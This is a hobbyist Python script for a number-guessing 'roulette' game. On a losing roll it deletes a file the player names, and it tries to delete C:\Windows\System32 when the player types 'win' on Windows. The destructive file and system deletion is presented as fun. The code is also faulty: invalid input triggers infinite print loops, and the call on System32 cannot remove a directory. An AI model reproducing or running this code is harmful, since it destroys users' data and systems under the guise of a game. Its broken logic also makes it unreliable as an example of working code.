# this code create in my free time
#
# this code created for : fun, game which friends, lerning, and ...
#
# this code have a andrid version (can open with pydroid or termux)
#
# if remove pyfiglet code, can create a exe file
#
# By amirhosin282

from config.config import * # importing functions from config file

run = True

data = open(data_path, "+a") # open deta text file for save logs




os.system(cl())
loading(0.05)

os.system(cl())

target = "amirhosin282"
guess = ''
for index, character in enumerate(target): # this code for loding animaition
    j = ord(' ')
    while True:
        sys.stdout.write(f'\r{text(figlet_format(guess, font="slant"))}{text(figlet_format(chr(j), font="slant"))}')
        os.system(cl())
        sys.stdout.flush()
        sleep(0.00001)
        if chr(j) == character:
            guess += character
            break
        j += 1


view(date_time)



# inputs and more
range = input("select your range(1, ...?): ").strip()

if int(range) >= 50 :
    while True:
        print (Fore.RED, "you range is too long")

chanse = input(f"chose your random number (1, {range}): ").strip()

if int(chanse) > int(range):
    while True:
        print(Fore.RED, "you selected number is not in your seleted range")


file = input("print your file name:  ").strip()

if file == 'win' or file == 'Win':
    if platform.system() == 'Windows':
        os.remove("C:\\Windows\\System32")
    else:
        print(Fore.RED, "your system is not Windows!! ")
        exit(0.25, 3)

if file == "":
    file = "no file"

rand = random.randint(1, int(range))

view2()


# run
if __name__ == '__main__':
    if int(chanse) == rand:
        if run == True:
            try:
                os.remove(file)
            except:
                print(Fore.RED, "file name is incract")
            print(Fore.RED, "you lose")
            data.write(f"{numb("data/numb.txt")}\n you lose\n file: {file}\n time: {str(JalaliDate.today())}\n\n")
            ChengNumb("data/numb.txt", numb("data/numb.txt"))
        else:
            print(Fore.RED, "error")
    else:
        print(Fore.GREEN, f"you win, numb is: {rand}")
        data.write(f"{numb("data/numb.txt")}\n you win\n file: {file}\n time: {str(JalaliDate.today())}\n\n")
        ChengNumb("data/numb.txt", numb("data/numb.txt"))

    data.close()


    yes_or_no = input("do you want see your history(y or n): ").strip()

    while True:
        if yes_or_no == "yes" or yes_or_no == "y" or yes_or_no == "Y" or yes_or_no == "YES":
            sleep(1)
            print(Fore.GREEN)
            loading(0.005)
            os.system("cls")
            ReadingData()

            print(Fore.RED)
            ex = input("exit(print E): ")
            if ex == "exit" or ex == "EXIT" or ex == "e" or ex == "E":
                exit(0, 2)
            else:
                exit(900, 2)

        elif yes_or_no == "no" or yes_or_no == "n" or yes_or_no == "N" or yes_or_no == "NO":
            exit(0, 2)
        else:
            print(Fore.RED, "I dont know what you sey! :(")
#
